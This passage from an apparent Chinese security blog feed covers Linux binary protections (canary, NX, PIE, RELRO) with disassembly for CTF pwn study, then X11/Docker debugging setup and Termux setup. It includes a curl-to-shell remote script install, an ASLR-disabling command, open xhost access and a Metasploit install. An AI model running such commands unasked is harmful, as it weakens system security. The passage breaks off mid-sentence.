title="Default（-fstack-protector）"></a>Default（<code>-fstack-protector</code>）</h2><p>默认情况下，开启了 Cannary 保护（即 <code>-fstack-protector</code> 参数），一开始会在栈上存储 Cannary（<code>QWORD PTR fs:0x28</code>），在程序结束时通过异或检查栈上的值是否正确来检查 Cannary 是否被篡改，如果不正确则调用 <code>__stack_chk_fail()</code> 产生报错：</p><pre><code class="asm">0000000000400596 &lt;main&gt;:  400596:    55                       push   rbp  400597:    48 89 e5                 mov    rbp,rsp  40059a:    48 83 ec 20              sub    rsp,0x20  40059e:    64 48 8b 04 25 28 00     mov    rax,QWORD PTR fs:0x28  4005a5:    00 00  4005a7:    48 89 45 f8              mov    QWORD PTR [rbp-0x8],rax  4005ab:    31 c0                    xor    eax,eax  4005ad:    48 8d 45 e0              lea    rax,[rbp-0x20]  4005b1:    48 89 c7                 mov    rdi,rax  4005b4:    b8 00 00 00 00           mov    eax,0x0  4005b9:    e8 c2 fe ff ff           call   400480 &lt;gets@plt&gt;  4005be:    b8 00 00 00 00           mov    eax,0x0  4005c3:    48 8b 55 f8              mov    rdx,QWORD PTR [rbp-0x8]  4005c7:    64 48 33 14 25 28 00     xor    rdx,QWORD PTR fs:0x28  4005ce:    00 00  4005d0:    74 05                    je     4005d7 &lt;main+0x41&gt;  4005d2:    e8 89 fe ff ff           call   400460 &lt;__stack_chk_fail@plt&gt;  4005d7:    c9                       leave  4005d8:    c3                       ret</code></pre><h2 id="fno-stack-protector"><a href="#fno-stack-protector" class="headerlink" title="-fno-stack-protector"></a><code>-fno-stack-protector</code></h2><p><code>-fstack-protector</code> 参数取消对栈的保护，直接编译成程序所对应的汇编：</p><pre><code class="asm">0000000000400526 &lt;main&gt;:  400526:    55                       push   rbp  400527:    48 89 e5                 mov    rbp,rsp  40052a:    48 83 ec 20              sub    rsp,0x20  40052e:    48 8d 45 e0              lea    rax,[rbp-0x20]  400532:    48 89 c7                 mov    rdi,rax  400535:    b8 00 00 00 00           mov    eax,0x0  40053a:    e8 d1 fe ff ff           call   400410 &lt;gets@plt&gt;  40053f:    b8 00 00 00 00           mov    eax,0x0  400544:    c9                       leave  400545:    c3                       ret</code></pre><h1 id="NX（DEP）"><a href="#NX（DEP）" class="headerlink" title="NX（DEP）"></a>NX（DEP）</h1><p>NX 即 No-eXecute（不可执行）的意思，NX（即 Windows 下的 DEP，数据执行保护）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入 Shellcode 时，程序会尝试在数据页面上执行指令，此时 CPU 就会抛出异常，而不是去执行恶意指令。</p><h2 id="Default（-z-noexecstack）"><a href="#Default（-z-noexecstack）" class="headerlink" title="Default（-z noexecstack）"></a>Default（<code>-z noexecstack</code>）</h2><p>默认开始 NX，栈上的数据不可执行：</p><pre><code class="gdb">assassinq$ vmmapStart              End                Perm    Name0x00400000         0x00401000         r-xp    /home/beale/Test_Dir/main0x00600000         0x00601000         r--p    /home/beale/Test_Dir/main0x00601000         0x00602000         rw-p    /home/beale/Test_Dir/main0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p    mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fdd000 0x00007ffff7fe0000 rw-p    mapped0x00007ffff7ff8000 0x00007ffff7ffa000 r--p    [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp    [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p    mapped0x00007ffffffde000 0x00007ffffffff000 rw-p    [stack]0xffffffffff600000 0xffffffffff601000 r-xp    [vsyscall]</code></pre><h2 id="z-execstack"><a href="#z-execstack" class="headerlink" title="-z execstack"></a><code>-z execstack</code></h2><p>开启栈可执行后，栈上的代码可被执行，同时其他处内存部分都是读写执行全开：</p><pre><code class="gdb">assassinq$ vmmapStart              End                Perm    Name0x00400000         0x00401000         r-xp    /home/beale/Test_Dir/main0x00600000         0x00601000         r-xp    /home/beale/Test_Dir/main0x00601000         0x00602000         rwxp    /home/beale/Test_Dir/main0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rwxp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rwxp    mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fdd000 0x00007ffff7fe0000 rwxp    mapped0x00007ffff7ff8000 0x00007ffff7ffa000 r--p    [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp    [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r-xp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rwxp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rwxp    mapped0x00007ffffffde000 0x00007ffffffff000 rwxp    [stack]0xffffffffff600000 0xffffffffff601000 r-xp    [vsyscall]</code></pre><h1 id="PIE（ASLR）"><a href="#PIE（ASLR）" class="headerlink" title="PIE（ASLR）"></a>PIE（ASLR）</h1><p>一般情况下 NX 和地址空间分布随机化（ASLR）会同时工作。<a href="https://blog.csdn.net/spenghui/article/details/79910884" target="_blank" rel="noopener">ASLR 不负责代码段以及数据段的随机化工作，这项工作由 PIE 负责；但是只有在开启 ASLR 之后，PIE 才会生效。</a>内存地址随机化机制（Address Space Layout Randomization)，有以下三种情况（具体的 ASLR 和 PIE 的互相作用：<a href="https://www.cnblogs.com/rec0rd/p/7646857.html）：" target="_blank" rel="noopener">https://www.cnblogs.com/rec0rd/p/7646857.html）：</a></p><ol><li>0 - 表示关闭进程地址空间随机化。</li><li>1 - 表示将 mmap 的基址，stack 和 Vdso 页面随机化。</li><li>2 - 表示在 1 的基础上增加 heap 的随机化。</li></ol><p>可以防范基于 ret2libc 方式的针对 DEP 的攻击。ASLR 和 DEP 配合使用，能有效阻止攻击者在堆栈上运行恶意代码。位置独立的可执行区域（Position-Independent Executables）使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（Return-Oriented Programming）方法变得难得多。</p><blockquote><p>Linux 关闭 PIE 的方法：</p><pre><code class="bash">echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></pre></blockquote><h2 id="Default（-no-pie）"><a href="#Default（-no-pie）" class="headerlink" title="Default（-no-pie）"></a>Default（<code>-no-pie</code>）</h2><p>默认不开启。静态分析程序时所得到的地址都是运行时的真实地址，基地址为 0x400000：</p><pre><code class="asm">0000000000400526 &lt;main&gt;:  400526:    55                       push   rbp  400527:    48 89 e5                 mov    rbp,rsp  40052a:    bf c4 05 40 00           mov    edi,0x4005c4  40052f:    e8 cc fe ff ff           call   400400 &lt;puts@plt&gt;  400534:    b8 00 00 00 00           mov    eax,0x0  400539:    5d                       pop    rbp  40053a:    c3                       ret</code></pre><p>与 gdb 调试的时候相同：</p><pre><code class="gdb">───────────────────────────────────── Code ─────────────────────────────────────   0x400521 &lt;frame_dummy+33&gt;:    jmp    0x4004a0 &lt;register_tm_clones&gt;   0x400526 &lt;main&gt;:    push   rbp   0x400527 &lt;main+1&gt;:    mov    rbp,rsp=&gt; 0x40052a &lt;main+4&gt;:    mov    edi,0x4005c4   0x40052f &lt;main+9&gt;:    call   0x400400 &lt;puts@plt&gt;   0x400534 &lt;main+14&gt;:    mov    eax,0x0   0x400539 &lt;main+19&gt;:    pop    rbp   0x40053a &lt;main+20&gt;:    ret</code></pre><h2 id="pie"><a href="#pie" class="headerlink" title="-pie"></a><code>-pie</code></h2><p><code>-fpie</code> 与 <code>-fPIE</code> 效果一样，用于编译；<code>-pie</code> 用于链接。开启 PIE 后的静态反编译结果没有基地址，每次运行时的基地址不同：</p><pre><code class="asm">0000000000000750 &lt;main&gt;: 750:    55                       push   rbp 751:    48 89 e5                 mov    rbp,rsp 754:    48 8d 3d 99 00 00 00     lea    rdi,[rip+0x99]        # 7f4 &lt;_IO_stdin_used+0x4&gt; 75b:    e8 90 fe ff ff           call   5f0 &lt;puts@plt&gt; 760:    b8 00 00 00 00           mov    eax,0x0 765:    5d                       pop    rbp 766:    c3                       ret</code></pre><p>gdb 调试时如下：</p><pre><code class="gdb">───────────────────────────────────── Code ─────────────────────────────────────   0x55555555474b &lt;frame_dummy+43&gt;:    jmp    0x555555554690 &lt;register_tm_clones&gt;   0x555555554750 &lt;main&gt;:    push   rbp   0x555555554751 &lt;main+1&gt;:    mov    rbp,rsp=&gt; 0x555555554754 &lt;main+4&gt;:    lea    rdi,[rip+0x99]        # 0x5555555547f4   0x55555555475b &lt;main+11&gt;:    call   0x5555555545f0 &lt;puts@plt&gt;   0x555555554760 &lt;main+16&gt;:    mov    eax,0x0   0x555555554765 &lt;main+21&gt;:    pop    rbp   0x555555554766 &lt;main+22&gt;:    ret[rip+0x99] : 0x5555555547f4 (&quot;Hello World&quot;)</code></pre><h1 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h1><p>在 Linux 系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处。GCC、GNU linker 以及 Glibc-dynamic linker 一起配合实现了一种叫做 relro（Read Only Relocation）的技术。大概实现就是由 linker 指定程序的一块经过 dynamic linker 处理过 relocation 之后的区域为只读.</p><p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对 GOT 攻击。RELRO 为 Partial RELRO，说明对 GOT 表具有写权限。</p><h2 id="Default（-z-lazy）"><a href="#Default（-z-lazy）" class="headerlink" title="Default（-z lazy）"></a>Default（<code>-z lazy</code>）</h2><p>默认情况下对 GOT 表具有写权限。可以看到 <code>puts</code> 和 <code>_libc_start_main</code> 所在的内存部分是可写的：</p><pre><code class="gdb">assassinq$ checksecCANARY    : disabledFORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : Partialassassinq$ got/home/beale/Test_Dir/main:     file format elf64-x86-64DYNAMIC RELOCATION RECORDSOFFSET           TYPE              VALUE0000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__0000000000601018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.50000000000601020 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5assassinq$ vmmapStart              End                Perm    Name0x00400000         0x00401000         r-xp    /home/beale/Test_Dir/main0x00600000         0x00601000         r--p    /home/beale/Test_Dir/main0x00601000         0x00602000         rw-p    /home/beale/Test_Dir/main0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p    mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fdd000 0x00007ffff7fe0000 rw-p    mapped0x00007ffff7ff8000 0x00007ffff7ffa000 r--p    [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp    [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p    mapped0x00007ffffffde000 0x00007ffffffff000 rw-p    [stack]0xffffffffff600000 0xffffffffff601000 r-xp    [vsyscall]</code></pre><h2 id="z-norelro"><a href="#z-norelro" class="headerlink" title="-z norelro"></a><code>-z norelro</code></h2><p>没有开启 RELRO 的情况：</p><pre><code class="gdb">assassinq$ checksecCANARY    : disabledFORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : disabledassassinq$ got/home/beale/Test_Dir/main:     file format elf64-x86-64DYNAMIC RELOCATION RECORDSOFFSET           TYPE              VALUE00000000006008a8 R_X86_64_GLOB_DAT  __gmon_start__00000000006008c8 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.500000000006008d0 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5assassinq$ vmmapStart              End                Perm    Name0x00400000         0x00401000         r-xp    /home/beale/Test_Dir/main0x00600000         0x00601000         rw-p    /home/beale/Test_Dir/main0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p    mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fdd000 0x00007ffff7fe0000 rw-p    mapped0x00007ffff7ff8000 0x00007ffff7ffa000 r--p    [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp    [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p    mapped0x00007ffffffde000 0x00007ffffffff000 rw-p    [stack]0xffffffffff600000 0xffffffffff601000 r-xp    [vsyscall]</code></pre><h2 id="z-now"><a href="#z-now" class="headerlink" title="-z now"></a><code>-z now</code></h2><p>此时无法修改 GOT 表。<code>puts</code> 和 <code>_libc_start_main</code> 所在的内存部分只有读权限：</p><pre><code class="gdb">assassinq$ checksecCANARY    : disabledFORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : FULLassassinq$ got/home/beale/Test_Dir/main:     file format elf64-x86-64DYNAMIC RELOCATION RECORDSOFFSET           TYPE              VALUE0000000000600fe8 R_X86_64_GLOB_DAT  puts@GLIBC_2.2.50000000000600ff0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.50000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__assassinq$ vmmapStart              End                Perm    Name0x00400000         0x00401000         r-xp    /home/beale/Test_Dir/main0x00600000         0x00601000         r--p    /home/beale/Test_Dir/main0x00601000         0x00602000         rw-p    /home/beale/Test_Dir/main0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p    mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fdd000 0x00007ffff7fe0000 rw-p    mapped0x00007ffff7ff8000 0x00007ffff7ffa000 r--p    [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp    [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p    /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p    mapped0x00007ffffffde000 0x00007ffffffff000 rw-p    [stack]0xffffffffff600000 0xffffffffff601000 r-xp    [vsyscall]</code></pre><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>各种安全选择的编译参数如下：</p><ul><li>NX：<code>-z execstack</code> / <code>-z noexecstack</code> (关闭 / 开启)</li><li>Canary：<code>-fno-stack-protector</code> / <code>-fstack-protector</code> / <code>-fstack-protector-all</code> (关闭 / 开启 / 全开启)</li><li>PIE：<code>-no-pie</code> / <code>-pie</code> (关闭 / 开启)</li><li>RELRO：<code>-z norelro</code> / <code>-z lazy</code> / <code>-z now</code> (关闭 / 部分开启 / 完全开启)</li></ul><p><img src="/pics/Linux下的各类程序保护机制/2.png" srcset="/img/loading.gif" alt></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="http://www.gandalf.site/2019/03/linux-pwn.html" target="_blank" rel="noopener">http://www.gandalf.site/2019/03/linux-pwn.html</a><br><a href="https://stackoverflow.com/questions/24465014/gcc-generate-canary-or-not" target="_blank" rel="noopener">https://stackoverflow.com/questions/24465014/gcc-generate-canary-or-not</a><br><a href="https://stackoverflow.com/questions/2463150/what-is-the-fpie-option-for-position-independent-executables-in-gcc-and-ld" target="_blank" rel="noopener">https://stackoverflow.com/questions/2463150/what-is-the-fpie-option-for-position-independent-executables-in-gcc-and-ld</a><br><a href="https://richardustc.github.io/2013-05-21-2013-05-21-pie.html" target="_blank" rel="noopener">https://richardustc.github.io/2013-05-21-2013-05-21-pie.html</a><br><a href="http://liudonghua.com/archives/2014/10/26/gcc_g++%E4%B8%AD%E7%9A%84pic%E4%B8%8Epie/" target="_blank" rel="noopener">http://liudonghua.com/archives/2014/10/26/gcc_g++%E4%B8%AD%E7%9A%84pic%E4%B8%8Epie/</a><br><a href="https://paper.seebug.org/481/" target="_blank" rel="noopener">https://paper.seebug.org/481/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前一直在做逆向，快一年没碰 PWN 了，接下来有一堆比赛，赶紧重新 PWN 起来。这里先整理一下 Linux 下的程序保护机制。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>使用X11在macOS上获得更好的体验</title>
    <link href="blog.b3ale.cn/2020/03/05/%E4%BD%BF%E7%94%A8X11%E5%9C%A8macOS%E4%B8%8A%E8%8E%B7%E5%BE%97%E6%9B%B4%E5%A5%BD%E7%9A%84%E4%BD%93%E9%AA%8C/"/>
    <id>blog.b3ale.cn/2020/03/05/%E4%BD%BF%E7%94%A8X11%E5%9C%A8macOS%E4%B8%8A%E8%8E%B7%E5%BE%97%E6%9B%B4%E5%A5%BD%E7%9A%84%E4%BD%93%E9%AA%8C/</id>
    <published>2020-03-05T01:05:31.000Z</published>
    <updated>2020-03-20T02:27:12.156Z</updated>
    
    <content type="html"><![CDATA[<p>X11 也叫做 X Window 系统，X Window 系统（X11 或 X）是一种位图显示的视窗系统。它是在 Unix 和 类 Unix 操作系统，以及 OpenVMS 上建立图形用户界面的标准工具包和协议，并可用于几乎所有已有的现代操作系统。</p><a id="more"></a><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><p>使用 Homebrew 下载 XQuartz：</p><pre><code class="bash">brew cask install xquartz</code></pre><p>打开 XQuartz 并设置如下：</p><pre><code class="bash">open -a XQuartz</code></pre><p><img src="/pics/使用X11在macOS上获得更好的体验/1.png" srcset="/img/loading.gif" alt></p><h1 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h1><p><code>ssh</code> 命令中加上 <code>-X</code> 参数，可以打开远程的 GUI 界面：</p><pre><code class="bash">$ ssh -X beale@192.168.2.190beale@192.168.2.190&#39;s password:Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage700 packages can be updated.452 updates are security updates.The programs included with the Ubuntu system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted byapplicable law.$ firefox</code></pre><p><img src="/pics/使用X11在macOS上获得更好的体验/2.png" srcset="/img/loading.gif" alt></p><h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><p>Docker 现在已经是一个配置环境的利器，缺点就是只有 CLI，但可以通过 X11 在 Docker 中开启 GUI。首先需要获取本机 IP 地址，并添加到 X11 Server 的列表中：</p><pre><code class="bash">$ IP=$(ifconfig en0 | grep inet | awk &#39;$1==&quot;inet&quot; {print $2}&#39;)$ echo $IP$ xhost + $IP</code></pre><p>通过参数 <code>-e</code> 覆盖容器内的环境变量 <code>DISPLAY=$IP:0</code>，并用 <code>-v</code> 参数挂载本地 <code>/tmp/.X11-unix</code> 到容器内部的同一位置，利用 Docker Hub 中提供的一个 Firefox 的镜像来启动装有 Firefox 浏览器的容器：</p><pre><code class="bash">docker run -d --name firefox -e DISPLAY=$IP:0 -v /tmp/.X11-unix:/tmp/.X11-unix jess/firefox</code></pre><p><img src="/pics/使用X11在macOS上获得更好的体验/3.png" srcset="/img/loading.gif" alt></p><h2 id="Upgrade"><a href="#Upgrade" class="headerlink" title="Upgrade"></a>Upgrade</h2><p>在 Docker 中使用 GDB 调试一般采用 tmux 来解决窗口的问题，很久之前看了 Swings 大佬的博客，发现了用 X11 来实现 GDB 弹窗的方法，这种感觉想想就爽。这里 XQuartz 主要作为一个新终端的承载器和 host 机器和 Docker 的通讯器。</p><p>和上面同理也是先获取 IP，再做一个环境变量的覆盖和 X11 文件的挂载，这里用我的镜像启动：</p><pre><code class="bash">docker run -it --rm --privileged -e DISPLAY=$IP:0 -v &quot;/tmp/.X11-unix:/tmp/.X11-unix&quot; -v &quot;$PWD:/root/tmp&quot; assassinq/pwn-machine-16.04:v8 /bin/bash</code></pre><p>然后终端需要设置一下字体的编码，测试的时候发现不改变编码弹窗的时候会发生乱码的情况：</p><pre><code class="bash">export LANG=C.UTF-8</code></pre><p>同时，弹窗的终端使用的是 lxterminal，一个比较轻量级的终端。exp 里终端设置如下：</p><pre><code class="python">context.terminal = [&quot;lxterminal&quot;, &quot;-e&quot;]</code></pre><p>接下来就可以开始愉快地调试了：</p><p><img src="/pics/使用X11在macOS上获得更好的体验/4.png" srcset="/img/loading.gif" alt></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://blog.csdn.net/hdzhang_blog/article/details/80058559" target="_blank" rel="noopener">https://blog.csdn.net/hdzhang_blog/article/details/80058559</a><br><a href="https://bestwing.me/Docker-for-Mac-and-run-gdb-GUI-window.html" target="_blank" rel="noopener">https://bestwing.me/Docker-for-Mac-and-run-gdb-GUI-window.html</a><br><a href="http://blog.lujun9972.win/blog/2018/04/24/docker%E5%AE%B9%E5%99%A8%E4%B8%AD%E8%B7%91gui%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E6%96%B9%E6%B3%95/index.html" target="_blank" rel="noopener">http://blog.lujun9972.win/blog/2018/04/24/docker%E5%AE%B9%E5%99%A8%E4%B8%AD%E8%B7%91gui%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E6%96%B9%E6%B3%95/index.html</a><br><a href="https://sourabhbajaj.com/blog/2017/02/07/gui-applications-docker-mac/" target="_blank" rel="noopener">https://sourabhbajaj.com/blog/2017/02/07/gui-applications-docker-mac/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;X11 也叫做 X Window 系统，X Window 系统（X11 或 X）是一种位图显示的视窗系统。它是在 Unix 和 类 Unix 操作系统，以及 OpenVMS 上建立图形用户界面的标准工具包和协议，并可用于几乎所有已有的现代操作系统。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="macos" scheme="blog.b3ale.cn/tags/macos/"/>
    
  </entry>
  
  <entry>
    <title>使用Termux在Android上打造小型Linux服务器</title>
    <link href="blog.b3ale.cn/2020/03/01/%E4%BD%BF%E7%94%A8Termux%E5%9C%A8Android%E4%B8%8A%E6%89%93%E9%80%A0%E5%B0%8F%E5%9E%8BLinux%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>blog.b3ale.cn/2020/03/01/%E4%BD%BF%E7%94%A8Termux%E5%9C%A8Android%E4%B8%8A%E6%89%93%E9%80%A0%E5%B0%8F%E5%9E%8BLinux%E6%9C%8D%E5%8A%A1%E5%99%A8/</id>
    <published>2020-03-01T02:50:30.000Z</published>
    <updated>2020-03-20T02:27:41.193Z</updated>
    
    <content type="html"><![CDATA[<p>使用 Termux 可以在 Android 上获得极佳的终端体验。</p><a id="more"></a><p>一些基础按键就不记录了。然后在 Termux 上的包管理工具有 pkg 和 apt，和 Debian 的基本一样，对我们来说已经很熟悉了。下面只是做一些简短的记录，用于备份。</p><h1 id="oh-my-zsh"><a href="#oh-my-zsh" class="headerlink" title="oh-my-zsh"></a>oh-my-zsh</h1><p>在 Termux 手机界面上可以完美实现 oh-my-zsh 的 agnoster 主题，在 Github 上已经有人实现了对应的安装脚本：</p><pre><code class="bash">sh -c &quot;$(curl -fsSL https://github.com/Cabbagec/termux-ohmyzsh/raw/master/install.sh)&quot;</code></pre><p>具体的安装过程也不列举了，装完后会让我们选主题和字体。成功之后根目录下会有一个 storage 目录，映射了手机系统上的一些文件夹，方便文件传输：</p><pre><code class="bash">$ ls -l storagetotal 24lrwxrwxrwx 1 u0_a146 u0_a146 26 Mar  1 12:45 dcim -&gt; /storage/emulated/0/DCIMlrwxrwxrwx 1 u0_a146 u0_a146 30 Mar  1 12:45 downloads -&gt; /storage/emulated/0/Downloadlrwxrwxrwx 1 u0_a146 u0_a146 30 Mar  1 12:45 movies -&gt; /storage/emulated/0/Movieslrwxrwxrwx 1 u0_a146 u0_a146 30 Mar  1 12:45 music -&gt; /storage/emulated/0/Musiclrwxrwxrwx 1 u0_a146 u0_a146 30 Mar  1 12:45 pictures -&gt; /storage/emulated/0/Pictureslrwxrwxrwx 1 u0_a146 u0_a146 22 Mar  1 12:45 shared -&gt; /storage/emulated/0</code></pre><p>同样，我们可以给 QQ 的文件传输整一个软链接：</p><pre><code class="bash">ln -s /data/data/com.termux/files/home/storage/shared/tencent/QQfile_recv QQ</code></pre><p>如此一来，传输文件就方便了很多：</p><pre><code class="bash">$ ls -al...lrwxrwxrwx 1 u0_a146 u0_a146   70 Mar  1 16:05 QQ -&gt; /data/data/com.termux/files/home/storage/shared/tencent/QQfile_recv...</code></pre><p>还能修改启动时的问候语：</p><pre><code class="bash">cp $PREFIX/etc/motd $PREFIX/etc/motd.bakvim $PREFIX/etc/motd</code></pre><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/1.png" srcset="/img/loading.gif" alt></p><h1 id="Change-apt-sources"><a href="#Change-apt-sources" class="headerlink" title="Change apt-sources"></a>Change apt-sources</h1><p>给 apt 换个清华源：</p><pre><code class="bash">export EDITOR=viapt edit-sources</code></pre><p>修改为以下内容：</p><pre><code class="txt"># The termux repository mirror from TUNA:deb https://mirrors.tuna.tsinghua.edu.cn/termux stable main</code></pre><h1 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h1><p>接下来装个 SSH，用电脑连上更方便地进行后续的安装。</p><pre><code class="bash">apt updateapt upgradeapt install openssh</code></pre><p>将电脑的公钥 push 到手机上：</p><pre><code class="bash">adb push ~/.ssh/id_rsa.pub /sdcard/authorized_keys</code></pre><p>在 Termux 中把电脑公钥放在 <code>.ssh</code> 目录下，并设置 authorized_keys 文件为拥有者只读。最后启动服务：</p><pre><code class="bash">cd .sshmv /sdcard/authorized_keys .chmod 400 authorized_keyssshd</code></pre><p>在电脑上转发 adb 端口并连接：</p><pre><code class="bash">adb forward tcp:8022 tcp:8022ssh localhost -p 8022</code></pre><h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><p>Python 必不可少。默认 Python 指 Python3，Python2 指 Python2：</p><pre><code class="bash">apt install python2apt install python # python3</code></pre><h1 id="IPython"><a href="#IPython" class="headerlink" title="IPython"></a>IPython</h1><p>IPython 的安装必须有 clang 的依赖，否则会报错：</p><pre><code class="bash">apt install clangpip install ipythonpip3.6 install ipython</code></pre><h1 id="tsu"><a href="#tsu" class="headerlink" title="tsu"></a>tsu</h1><p>用 tsu 替代 su 可以完美实现 root 转换：</p><pre><code class="bash">apt install tsu</code></pre><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/2.png" srcset="/img/loading.gif" alt></p><h1 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h1><p>需要联（ke）网（xue）下载：</p><pre><code class="bash">apt install unstable-repoapt install metasploit</code></pre><p>输入 msfconsole 可以查看效果：</p><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/3.png" srcset="/img/loading.gif" alt></p><p>这个版本也已经有 